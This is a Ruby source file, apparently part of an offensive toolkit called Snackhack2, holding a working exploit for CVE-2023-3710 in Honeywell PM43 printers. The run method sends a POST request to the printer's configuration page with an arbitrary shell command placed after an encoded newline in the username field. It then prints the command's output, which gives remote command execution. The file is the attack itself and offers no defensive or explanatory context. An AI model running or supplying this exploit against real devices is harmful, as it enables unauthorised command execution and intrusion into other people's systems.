# frozen_string_literal: true

require 'httparty'
module Snackhack2
  class HoneywellPM43
    # CVE-2023-3710
    # Source: https://www.exploit-db.com/exploits/51885
    attr_accessor :command

    def initialize(site, command: 'ls', save_file: true)
      @site = site
      @command = command
    end

    def run
      pp = HTTParty.post(File.join(@site, 'loadfile.lp?pageid=Configure'),
                         body: "username=x%0a#{@command}%0a&userpassword=1")
      if pp.code == 200
        puts pp
      else
        puts "[+] Status Code: #{pp.code}"
      end
    end
  end
end
